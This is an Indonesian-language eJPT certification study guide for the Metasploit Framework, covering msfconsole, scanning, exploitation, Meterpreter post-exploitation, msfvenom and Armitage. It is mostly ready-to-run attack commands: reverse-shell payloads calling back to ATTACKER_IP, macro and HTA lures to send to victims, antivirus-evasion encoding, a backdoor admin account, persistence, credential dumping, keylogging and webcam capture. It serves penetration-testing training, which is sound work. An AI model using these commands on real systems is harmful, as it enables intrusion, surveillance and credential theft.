# eJPT — The Metasploit Framework (MSF)
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin.

---

## Daftar Isi

1. [Introduction to Metasploit](#1-introduction-to-metasploit)
2. [Metasploit Architecture](#2-metasploit-architecture)
3. [Msfconsole Basics](#3-msfconsole-basics)
4. [Information Gathering & Enumeration](#4-information-gathering--enumeration)
5. [Vulnerability Scanning](#5-vulnerability-scanning)
6. [Client-Side Attacks](#6-client-side-attacks)
7. [Exploitation](#7-exploitation)
8. [Post-Exploitation & Meterpreter](#8-post-exploitation--meterpreter)
9. [Payloads & Msfvenom](#9-payloads--msfvenom)
10. [Armitage](#10-armitage)

---

## 1. Introduction to Metasploit

### Apa itu Metasploit?

Metasploit Framework (MSF) adalah platform open-source untuk pengembangan dan eksekusi exploit terhadap target yang rentan. Dikembangkan oleh Rapid7, MSF adalah tool paling populer di dunia penetration testing.

### Kegunaan MSF dalam Pentest

| Fase Pentest | Kegunaan MSF |
|---|---|
| Reconnaissance | Port scan, service enumeration via auxiliary |
| Scanning | Vulnerability scanning dengan auxiliary scanner |
| Exploitation | Eksploitasi kerentanan dengan exploit modules |
| Post-Exploitation | Meterpreter: privilege escalation, pivoting, dll |
| Reporting | Database untuk menyimpan hasil |

### Edisi Metasploit

- **Metasploit Framework** → open-source, CLI, yang digunakan di eJPT
- **Metasploit Pro** → komersial, GUI lengkap, fitur tambahan

### Lokasi Penting di Kali Linux

```
/usr/share/metasploit-framework/        → direktori utama MSF
/usr/share/metasploit-framework/modules → semua modules
/usr/share/metasploit-framework/plugins → plugins
~/.msf4/                                → konfigurasi user
~/.msf4/loot/                           → hasil loot
~/.msf4/logs/                           → log
```

---

## 2. Metasploit Architecture

### Struktur Module

```
modules/
├── auxiliary/      → scanning, enumeration, fuzzing, sniffing
├── exploits/       → kode eksploitasi kerentanan
├── payloads/       → kode yang dieksekusi setelah exploit berhasil
├── post/           → post-exploitation (setelah dapat akses)
├── encoders/       → enkode payload agar bypass AV
├── evasion/        → bypass antivirus/EDR
└── nops/           → NOP sled untuk buffer overflow
```

### Jenis Module

**Auxiliary** — tidak mengeksploitasi, digunakan untuk:
- Scanner (port, service, vulnerability)
- Fuzzer
- Sniffer
- Brute forcer

**Exploit** — kode untuk mengeksploitasi kerentanan spesifik. Selalu digunakan bersama payload.

**Payload** — kode yang dijalankan di sistem target setelah exploit berhasil.

**Post** — digunakan setelah mendapat sesi, untuk:
- Privilege escalation
- Credential harvesting
- Pivoting
- Persistence

**Encoder** — mengenkode payload untuk menghindari deteksi signature-based AV.

**Evasion** — teknik bypass AV yang lebih canggih dari encoder.

### Jenis Payload

```
Singles (Inline)
  → payload lengkap dalam satu paket
  → contoh: windows/shell_reverse_tcp
  → tidak butuh stage kedua
  → lebih stabil, ukuran lebih besar

Staged
  → dikirim dalam dua tahap:
     Stage 1: stager kecil → buka koneksi ke attacker
     Stage 2: stage besar (Meterpreter) → dikirim via koneksi itu
  → contoh: windows/meterpreter/reverse_tcp
  → ukuran stage 1 kecil (bypass size restriction)
  → lebih powerful

Cara beda Single vs Staged di nama:
  windows/shell_reverse_tcp      → single (underscore setelah shell)
  windows/shell/reverse_tcp      → staged (slash setelah shell)
  windows/meterpreter_reverse_tcp → single meterpreter
  windows/meterpreter/reverse_tcp → staged meterpreter
```

### Payload Types

| Payload | Keterangan |
|---|---|
| `shell_bind_tcp` | Buka port di target, attacker connect ke sana |
| `shell_reverse_tcp` | Target connect balik ke attacker |
| `meterpreter/reverse_tcp` | Meterpreter staged, reverse connection |
| `meterpreter/bind_tcp` | Meterpreter staged, bind connection |
| `meterpreter_reverse_https` | Meterpreter via HTTPS (bypass firewall) |

**Reverse vs Bind:**
- **Reverse** → target konek ke attacker (lebih sering digunakan, bypass firewall lebih mudah)
- **Bind** → attacker konek ke target (butuh port target accessible)

---

## 3. Msfconsole Basics

### Menjalankan Metasploit

```bash
# Start PostgreSQL database (untuk menyimpan hasil)
service postgresql start

# Inisialisasi database MSF (pertama kali)
msfdb init

# Jalankan msfconsole
msfconsole
msfconsole -q    # tanpa banner
```

### Perintah Dasar msfconsole

```bash
# ─── NAVIGASI ────────────────────────────────────────────

help                    # tampilkan semua perintah
?                       # sama dengan help

search <keyword>        # cari module
search type:exploit platform:windows smb
search cve:2017-0144    # cari berdasarkan CVE
search name:eternalblue

use <module_path>       # pilih module
use exploit/windows/smb/ms17_010_eternalblue
use 0                   # gunakan nomor hasil search

info                    # info detail module yang dipilih
back                    # keluar dari module saat ini
previous                # kembali ke module sebelumnya

# ─── OPTIONS ─────────────────────────────────────────────

show options            # tampilkan opsi module
show advanced           # opsi advanced
show payloads           # payload yang kompatibel
show targets            # target OS yang didukung
show missing            # opsi yang belum diisi (wajib diisi)

set RHOSTS 192.168.1.10         # set target IP
set RHOSTS 192.168.1.0/24       # set subnet
set RPORT 445                    # set port target
set LHOST 192.168.1.5            # set IP attacker (untuk reverse)
set LPORT 4444                   # set port listener
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0                     # set target index

unset RHOSTS                     # hapus nilai option
unset all                        # hapus semua nilai

setg LHOST 192.168.1.5           # set global (berlaku untuk semua module)
setg RHOSTS 192.168.1.10
unsetg LHOST                     # hapus global option

# ─── EKSEKUSI ────────────────────────────────────────────

run                     # jalankan module
exploit                 # sama dengan run
run -j                  # jalankan sebagai background job
exploit -z              # exploit dan langsung background session
check                   # cek apakah target vulnerable (jika didukung)

# ─── SESSIONS ────────────────────────────────────────────

sessions                # list semua sesi aktif
sessions -l             # sama dengan sessions
sessions -i 1           # interact dengan sesi nomor 1
sessions -k 1           # kill sesi nomor 1
sessions -k all         # kill semua sesi
sessions -u 1           # upgrade shell ke meterpreter

# ─── JOBS ────────────────────────────────────────────────

jobs                    # list background jobs
jobs -l                 # sama dengan jobs
jobs -k 1               # kill job nomor 1

# ─── DATABASE ────────────────────────────────────────────

db_status               # cek koneksi database
workspace               # lihat workspace saat ini
workspace -a pentest1   # buat workspace baru
workspace pentest1      # pindah ke workspace

hosts                   # tampilkan host yang ditemukan
services                # tampilkan service yang ditemukan
vulns                   # tampilkan kerentanan yang ditemukan
creds                   # tampilkan credentials yang ditemukan
loot                    # tampilkan loot yang dikumpulkan
notes                   # tampilkan catatan

db_nmap -sV TARGET_IP   # nmap langsung ke database MSF

# ─── LAINNYA ─────────────────────────────────────────────

save                    # simpan konfigurasi
reload_all              # reload semua modules
version                 # versi MSF
history                 # riwayat perintah
exit / quit             # keluar dari msfconsole

# Shell command langsung dari msfconsole
!whoami
!ls /tmp
shell                   # akses OS shell dari msfconsole
```

### Resource Scripts

Resource script adalah file yang berisi perintah msfconsole yang dieksekusi otomatis.

```bash
# Jalankan resource script
msfconsole -r /path/to/script.rc

# Dari dalam msfconsole
resource /path/to/script.rc

# Simpan perintah saat ini sebagai resource script
makerc /path/to/output.rc

# Contoh isi resource script (setup_handler.rc):
# use multi/handler
# set PAYLOAD windows/meterpreter/reverse_tcp
# set LHOST 192.168.1.5
# set LPORT 4444
# run -j
```

---

## 4. Information Gathering & Enumeration

### Port Scanning dengan MSF

```bash
# TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10
run

# SYN scanner (butuh root)
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-65535
run

# UDP scanner
use auxiliary/scanner/portscan/udp
set RHOSTS 192.168.1.10
run

# Lebih efisien: gunakan db_nmap
db_nmap -sV -sC -O TARGET_IP
```

### Service Enumeration

```bash
# ─── SMB ──────────────────────────────────────────────────

use auxiliary/scanner/smb/smb_version
set RHOSTS TARGET_IP
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS TARGET_IP
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS TARGET_IP
run

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# ─── FTP ──────────────────────────────────────────────────

use auxiliary/scanner/ftp/ftp_version
set RHOSTS TARGET_IP
run

use auxiliary/scanner/ftp/anonymous
set RHOSTS TARGET_IP
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS TARGET_IP
set USER_FILE path/to/file.txt
set PASS_FILE path/to/file.txt
run

# ─── SSH ──────────────────────────────────────────────────

use auxiliary/scanner/ssh/ssh_version
set RHOSTS TARGET_IP
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# ─── HTTP ─────────────────────────────────────────────────

use auxiliary/scanner/http/http_version
set RHOSTS TARGET_IP
run

use auxiliary/scanner/http/http_header
set RHOSTS TARGET_IP
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS TARGET_IP
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

use auxiliary/scanner/http/robots_txt
set RHOSTS TARGET_IP
run

# ─── SNMP ─────────────────────────────────────────────────

use auxiliary/scanner/snmp/snmp_login
set RHOSTS TARGET_IP
run

use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET_IP
set COMMUNITY public
run

# ─── MYSQL ────────────────────────────────────────────────

use auxiliary/scanner/mysql/mysql_version
set RHOSTS TARGET_IP
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ─── RDP ──────────────────────────────────────────────────

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS TARGET_IP
run
```

---

## 5. Vulnerability Scanning

### MSF sebagai Vulnerability Scanner

```bash
# Scan kerentanan SMB
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# Scan EternalBlue (MS17-010)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Scan MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS TARGET_IP
check    # cek tanpa exploit

# HTTP vulnerability
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS TARGET_IP
run
```

### Integrasi dengan Nmap & Nessus

```bash
# Import hasil nmap XML ke MSF database
db_import /path/to/nmap_output.xml

# Import hasil Nessus
db_import /path/to/nessus_output.nessus

# Lihat hasil import
hosts
services
vulns
```

### Vulnerability Scanning Workflow

```bash
# 1. Setup workspace
workspace -a target_scan

# 2. Scan dengan nmap (hasil masuk database)
db_nmap -sV -sC -O 192.168.1.0/24

# 3. Lihat host & service yang ditemukan
hosts
services

# 4. Scan vulnerability berdasarkan service yang ditemukan
# Misalnya ada SMB port 445 → scan EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:/tmp/smb_hosts.txt
run

# 5. Lihat hasil
vulns
```

---

## 6. Client-Side Attacks

### Konsep Client-Side Attacks

Client-side attacks menargetkan **aplikasi di sisi client** (browser, Office, PDF reader) bukan server. Target harus **membuka file atau mengklik link** yang berbahaya.

Skenario umum:
- Korban membuka dokumen Word/Excel berbahaya
- Korban mengklik link yang mengarah ke exploit
- Korban membuka file PDF berbahaya

### Msfvenom untuk Client-Side Payload

```bash
# ─── WINDOWS EXECUTABLE ────────────────────────────────────

# Basic reverse shell .exe
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o payload.exe

# 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o payload64.exe

# ─── OFFICE MACRO ──────────────────────────────────────────

# Generate VBA macro untuk dokumen Office
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f vba -o macro.vba

# Cara pakai:
# 1. Buka Word/Excel → Developer → Visual Basic
# 2. Paste isi macro.vba
# 3. Simpan sebagai .docm atau .xlsm
# 4. Kirim ke korban

# ─── HTA (HTML Application) ────────────────────────────────

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f hta-psh -o payload.hta

# Hosting di web server
cp payload.hta /var/www/html/
service apache2 start
# Kirim link ke korban: http://ATTACKER_IP/payload.hta

# ─── POWERSHELL ────────────────────────────────────────────

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f psh -o payload.ps1

# ─── PDF ───────────────────────────────────────────────────

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f pdf -o payload.pdf
```

### Handler untuk Client-Side Attack

Selalu setup listener sebelum mengirim payload ke korban:

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run -j    # jalankan di background sebagai job
```

### Web Delivery Module

Module ini meng-host payload di web server MSF dan generate perintah untuk dijalankan di target.

```bash
use exploit/multi/script/web_delivery
set TARGET 2             # 0=PHP, 1=Python, 2=PowerShell, 3=Regsvr32
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run

# MSF akan generate perintah seperti:
# powershell.exe -nop -w hidden -e JABzAD0ATgBlAH...
# Jalankan perintah ini di target (via RCE, social engineering, dll)
```

### Browser Exploitation

```bash
# BeEF integration (browser exploitation)
use auxiliary/server/browser_autopwn2
set LHOST ATTACKER_IP
set URIPATH /
run
# Kirim URL ke korban → browser otomatis dieksploitasi
```

---

## 7. Exploitation

### Workflow Eksploitasi

```
1. Identifikasi service & versi (nmap/auxiliary scanner)
2. Cari exploit yang sesuai (search di MSF)
3. Pilih exploit (use)
4. Cek kompatibilitas target (show targets, check)
5. Set options (RHOSTS, LHOST, LPORT, PAYLOAD)
6. Run exploit
7. Interact dengan sesi yang didapat
```

### Mencari & Memilih Exploit

```bash
# Cari berdasarkan service/CVE
search ms17-010
search eternalblue
search type:exploit platform:windows smb rank:excellent

# Lihat rank exploit:
# excellent > great > good > normal > average > low > manual

# Pilih exploit
use exploit/windows/smb/ms17_010_eternalblue

# Cek info lengkap
info

# Lihat target yang didukung
show targets

# Cek apakah target vulnerable (tidak semua exploit support ini)
check
```

### Exploit Umum di eJPT

```bash
# ─── MS17-010 ETERNALBLUE (Windows 7/Server 2008) ──────────

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run

# ─── MS08-067 (Windows XP/Server 2003) ─────────────────────

use exploit/windows/smb/ms08_067_netapi
set RHOSTS TARGET_IP
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run

# ─── VSFTPD 2.3.4 BACKDOOR ─────────────────────────────────

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run

# ─── UNREAL IRCD BACKDOOR ──────────────────────────────────

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS TARGET_IP
run

# ─── SAMBA (usermap_script) ────────────────────────────────

use exploit/multi/samba/usermap_script
set RHOSTS TARGET_IP
set PAYLOAD cmd/unix/reverse
set LHOST ATTACKER_IP
run

# ─── APACHE STRUTS (CVE-2017-5638) ─────────────────────────

use exploit/multi/http/struts2_content_type_ognl
set RHOSTS TARGET_IP
set RPORT 8080
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run

# ─── TOMCAT (default credentials) ──────────────────────────

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST ATTACKER_IP
run

# ─── BRUTE FORCE SSH ────────────────────────────────────────

use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
run

# ─── PSEXEC (dengan credentials) ────────────────────────────

use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass password123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run
```

---

## 8. Post-Exploitation & Meterpreter

### Meterpreter Overview

Meterpreter adalah payload advanced yang berjalan **di memory** (tidak menulis ke disk), menggunakan **encrypted communication**, dan sangat sulit dideteksi AV. Fitur jauh lebih lengkap dari shell biasa.

### Perintah Dasar Meterpreter

```bash
# ─── SYSTEM INFO ─────────────────────────────────────────

sysinfo                 # info sistem (OS, hostname, arch)
getuid                  # user saat ini
getpid                  # process ID meterpreter
ps                      # list semua proses
pwd                     # direktori saat ini
ls                      # list file

# ─── NAVIGASI FILE ───────────────────────────────────────

cd /tmp
ls
cat /etc/passwd
download /etc/passwd /tmp/passwd_local    # download file
upload /tmp/tool.exe C:\\Windows\\Temp\\  # upload file
edit /tmp/file.txt                        # edit file
mkdir /tmp/newdir
rm /tmp/file.txt
search -f "*.txt"                         # cari file
search -f "password*" -d C:\\Users\\      # cari di direktori

# ─── SHELL ───────────────────────────────────────────────

shell                   # akses shell OS biasa
# Keluar dari shell kembali ke meterpreter:
# Ctrl+Z atau exit

# ─── PRIVILEGE ESCALATION ────────────────────────────────

getuid                  # cek user saat ini
getsystem               # coba otomatis escalate ke SYSTEM
# Metode: getsystem mencoba beberapa teknik sekaligus

# Manual privilege escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
# Lihat exploit lokal yang mungkin berhasil, lalu gunakan

# ─── PERSISTENCE ─────────────────────────────────────────

# Buat user baru (Windows)
execute -f cmd.exe -a "/c net user hacker Password123! /add"
execute -f cmd.exe -a "/c net localgroup administrators hacker /add"

# Persistence via registry (Windows)
run post/windows/manage/persistence_exe STARTUP=REGISTRY

# ─── CREDENTIAL HARVESTING ───────────────────────────────

# Dump password hash (butuh SYSTEM atau admin)
hashdump

# Dump semua credentials dengan mimikatz
load kiwi                # load kiwi (mimikatz)
creds_all               # dump semua credentials
lsa_dump_sam            # dump SAM database
lsa_dump_secrets        # dump LSA secrets
wifi_list               # dump WiFi passwords

# ─── NETWORK ─────────────────────────────────────────────

ipconfig                # network interfaces
arp                     # ARP table
netstat                 # koneksi aktif
route                   # routing table

portfwd add -l 8080 -p 80 -r INTERNAL_HOST   # port forward
portfwd list
portfwd delete -l 8080

# ─── PIVOTING ────────────────────────────────────────────

run post/multi/manage/autoroute SUBNET=192.168.2.0/24
# atau
run autoroute -s 192.168.2.0/24
run autoroute -p             # lihat routes yang ditambahkan

# ─── SCREENSHOT & KEYLOGGER ──────────────────────────────

screenshot              # ambil screenshot desktop
keyscan_start           # mulai keylogger
keyscan_dump            # dump hasil keylogger
keyscan_stop            # hentikan keylogger

# ─── WEBCAM & MICROPHONE ─────────────────────────────────

webcam_list             # list webcam
webcam_snap             # ambil foto dari webcam
record_mic -d 10        # rekam mic 10 detik

# ─── BACKGROUND / MANAGE SESSIONS ────────────────────────

background              # background session (Ctrl+Z)
sessions -l             # list sessions
sessions -i 1           # kembali ke session 1
sessions -u 1           # upgrade shell ke meterpreter
```

### Post-Exploitation Modules

```bash
# Recon setelah dapat akses
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Gather system info
use post/windows/gather/enum_system
use post/linux/gather/enum_system

# Dump credentials
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Enumerate installed software (Windows)
use post/windows/gather/enum_applications

# Network enumeration dari dalam target
use post/multi/gather/ping_sweep
set RHOSTS 192.168.2.0/24
set SESSION 1
run
```

---

## 9. Payloads & Msfvenom

### Msfvenom Overview

Msfvenom menggabungkan `msfpayload` dan `msfencode` menjadi satu tool untuk generate dan enkode payload.

### Sintaks Dasar

```bash
msfvenom -p <PAYLOAD> [OPTIONS] -f <FORMAT> -o <OUTPUT_FILE>

# Parameter penting:
# -p  : payload yang digunakan
# -l  : list payload/format/encoder
# -f  : format output
# -o  : file output
# -e  : encoder
# -i  : jumlah iterasi encoding
# -b  : bad characters (untuk buffer overflow)
# -x  : template executable
# -k  : keep template behavior
# LHOST, LPORT : untuk reverse payload
```

### List Payload & Format

```bash
# List semua payload
msfvenom -l payloads

# List payload untuk platform tertentu
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep android

# List format output
msfvenom -l formats

# List encoder
msfvenom -l encoders
```

### Generate Payload per Platform

```bash
# ─── WINDOWS ───────────────────────────────────────────────

# .exe reverse meterpreter
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o win_payload.exe

# .exe 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o win64_payload.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o payload.dll

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f psh-cmd -o payload.ps1

# ASP (web shell Windows IIS)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f aspx -o shell.aspx

# ─── LINUX ─────────────────────────────────────────────────

# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f elf -o linux_payload

# 32-bit
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f elf -o linux32_payload

# ─── WEB SHELLS ────────────────────────────────────────────

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f raw -o shell.php

# JSP (Java/Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f war -o shell.war

# ─── ANDROID ───────────────────────────────────────────────

msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -o payload.apk

# ─── MACOS ─────────────────────────────────────────────────

msfvenom -p osx/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f macho -o payload.macho
```

### Encoding Payload (Bypass AV Dasar)

```bash
# Encode dengan shikata_ga_nai (paling populer)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o encoded_payload.exe

# Encode dengan template executable asli
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -x /usr/share/windows-resources/binaries/plink.exe \
  -f exe -o injected_payload.exe

# List encoder
msfvenom -l encoders
# x86/shikata_ga_nai    → excellent rank, paling sering dipakai
# x64/xor_dynamic       → untuk 64-bit
```

### Multi/Handler Listener

Selalu setup listener sebelum payload dieksekusi di target:

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # harus sama dengan payload
set LHOST 0.0.0.0     # listen di semua interface
set LPORT 4444
set ExitOnSession false  # jangan berhenti setelah dapat satu sesi
run -j                   # jalankan sebagai background job
```

---

## 10. Armitage

### Apa itu Armitage?

Armitage adalah **GUI front-end** untuk Metasploit Framework. Memvisualisasikan target, menyederhanakan proses exploitation, dan memungkinkan kolaborasi tim (via Cobalt Strike — versi komersialnya).

### Menjalankan Armitage

```bash
# Pastikan PostgreSQL dan MSF berjalan
service postgresql start
msfdb init

# Jalankan Armitage
armitage
```

Saat pertama dibuka, Armitage akan minta koneksi ke MSF RPC server:
- Host: 127.0.0.1
- Port: 55553
- Username: msf
- Password: (kosong atau sesuai konfigurasi)

### Interface Armitage

```
┌─────────────────────────────────────────────────────┐
│  Menu Bar: Armitage | View | Hosts | Attacks | Help  │
├──────────────┬──────────────────────────────────────┤
│              │                                       │
│   Module     │         Target Workspace              │
│   Browser    │   (visualisasi host & koneksi)        │
│   (kiri)     │                                       │
│              ├──────────────────────────────────────┤
│              │         Console/Tabs                  │
│              │   (output, meterpreter sessions)      │
└──────────────┴──────────────────────────────────────┘
```

### Workflow di Armitage

```
1. HOST DISCOVERY
   Hosts → Nmap Scan → Intense Scan
   atau: Hosts → Add Hosts (manual)

2. PORT & SERVICE SCAN
   Klik kanan host → Scan
   atau gunakan Nmap dari menu Hosts

3. FIND ATTACKS
   Attacks → Find Attacks
   Armitage otomatis saran exploit berdasarkan service yang ditemukan

4. EXPLOITATION
   Klik kanan host → Attack → pilih exploit
   Set options → Launch
   Host berhasil dieksploitasi → icon berubah merah dengan petir

5. INTERACT
   Klik kanan host yang sudah owned → Meterpreter/Shell
   → Interact: buka meterpreter console
   → Access: browse files, upload/download
   → Escalate Privilege: getsystem
   → Pivot: setup routing ke jaringan internal

6. HAIL MARY
   Attacks → Hail Mary
   Armitage otomatis mencoba SEMUA exploit yang kompatibel
   (sangat agresif, gunakan hati-hati di lab)
```

### Fitur Penting Armitage

| Fitur | Cara Akses | Fungsi |
|---|---|---|
| Nmap Scan | Hosts → Nmap Scan | Scan host & service |
| Find Attacks | Attacks → Find Attacks | Saran exploit otomatis |
| Hail Mary | Attacks → Hail Mary | Auto-exploit semua target |
| MSF Console | View → Console | Akses msfconsole langsung |
| Sessions | View → Sessions | Manage semua sesi |
| File Browser | Klik kanan → Access → Browse Files | GUI file manager |
| Post Modules | Klik kanan → Post Modules | Jalankan post modules |

### Catatan Armitage untuk eJPT

- Armitage memudahkan visualisasi jaringan dan manajemen banyak sesi
- Di ujian eJPT, pemahaman msfconsole tetap lebih penting
- Armitage berguna untuk lab yang melibatkan banyak host
- "Find Attacks" sangat membantu untuk menemukan exploit yang relevan secara otomatis

---

## Quick Reference

### Cheat Sheet Msfconsole

```bash
search <keyword>         → cari module
use <module>             → pilih module
info                     → info module
show options             → lihat opsi
set <OPTION> <value>     → set nilai
run / exploit            → jalankan
sessions -l              → list sesi
sessions -i <id>         → masuk ke sesi
background / Ctrl+Z      → background sesi
```

### Cheat Sheet Meterpreter

```bash
sysinfo / getuid         → info sistem & user
getsystem                → escalate ke SYSTEM
hashdump                 → dump password hash
shell                    → akses OS shell
download / upload        → transfer file
portfwd add              → port forwarding
run autoroute            → setup pivot route
load kiwi → creds_all    → dump semua credentials
keyscan_start/dump       → keylogger
screenshot               → ambil screenshot
background               → background sesi
```

### Cheat Sheet Msfvenom

```bash
# Windows reverse meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe

# Linux reverse meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Handler
use multi/handler
set PAYLOAD <sama dengan payload>
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

### Module Path Format

```
auxiliary/scanner/smb/smb_version
exploit/windows/smb/ms17_010_eternalblue
post/windows/gather/hashdump
payload/windows/meterpreter/reverse_tcp
```

---

*Dibuat untuk studi eJPT — The Metasploit Framework*
*Gunakan hanya di lingkungan yang telah mendapat izin*
